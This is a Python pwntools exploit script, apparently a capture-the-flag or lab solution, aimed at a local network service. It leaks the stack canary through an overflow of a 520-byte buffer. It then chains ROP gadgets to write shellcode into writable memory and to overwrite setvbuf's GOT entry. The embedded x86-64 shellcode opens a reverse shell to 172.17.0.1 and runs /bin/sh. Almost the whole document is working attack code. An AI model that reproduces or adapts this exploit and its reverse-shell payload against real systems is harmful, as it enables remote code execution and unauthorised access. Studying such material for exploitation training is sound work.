from pwn import *
from time import sleep
from socket import inet_aton

HOST = "localhost"
PORT = 9000

LHOST = "172.17.0.1"
SHELLCODE = b"j)X\x99j\x02_j\x01^\x0f\x05H\x97H\xb9\x02\x00\x11\\\x7f\x00\x00\x01QH\x89\xe6j\x10Zj*X\x0f\x05j\x03^H\xff\xcej!X\x0f\x05u\xf6j;X\x99H\xbb/bin/sh\x00SH\x89\xe7RWH\x89\xe6\x0f\x05"
POP_RSI = 0x401821

context.os = 'linux'
context.arch = 'amd64'

def init_remote(host, port, payload):
	r = remote(host, port)
	r.recvuntil(b"number of strings: ")
	r.sendline(b"1")
	r.recvuntil(b"string: ")
	r.sendline(payload)
	return r

def leak_stack_chk(host, port):
	r = init_remote(host, port, b"A"*520)
	return b"\x00" + r.recvall()[542:549]

if LHOST != "127.0.0.1":
	scode = SHELLCODE[:20] + inet_aton(LHOST) + SHELLCODE[24:]

stack_chk = leak_stack_chk(HOST, PORT)
print(f"found stack canary: {stack_chk}")

payload  = b"A"*520		# garbage
payload += stack_chk		# stack canary
payload += b"BBBBBBBB"		# rbp
payload += p64(POP_RSI)	# pop rsi ; pop r15 ; ret
payload += p64(0x404000)	# rsi, RWX address
payload += p64(0)		# r15, NULL
payload += p64(0x4011f4)	# read
payload += p64(POP_RSI)	# pop rsi ; pop r15 ; ret
payload += p64(0x404080)	# rsi, setvbuf @got
payload += p64(0)		# r15, NULL
payload += p64(0x4011f4)	# read
payload += p64(0x401234)	# setvbuf @plt

r = init_remote(HOST, PORT, payload)
r.recv(519)
r.sendline(scode)
sleep(2)
r.send(p64(0x404000))

